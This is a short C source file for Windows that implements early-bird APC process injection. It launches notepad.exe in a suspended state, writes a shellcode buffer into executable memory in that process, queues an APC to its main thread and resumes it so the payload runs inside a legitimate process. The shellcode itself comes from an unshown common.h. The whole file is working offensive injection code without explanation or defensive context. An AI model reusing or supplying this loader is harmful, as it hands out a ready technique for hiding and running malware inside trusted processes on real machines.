#include "common.h"

int main() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Create suspended — thread alertable during init
    if (!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {
        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[*] Created suspended PID: %lu TID: %lu\n",
            pi.dwProcessId, pi.dwThreadId);

    // Allocate and write shellcode
    LPVOID remoteMem = VirtualAllocEx(
        pi.hProcess, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n", written, remoteMem);

    // Queue APC to the main thread before it runs
    // Thread is alertable during early initialization
    DWORD result = QueueUserAPC(
        (PAPCFUNC)remoteMem,
        pi.hThread,
        NULL
    );
    wprintf(L"[+] APC queued: %lu\n", result);

    // Resume — thread executes APC before anything else
    ResumeThread(pi.hThread);
    wprintf(L"[*] Thread resumed — APC executes during init\n");

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
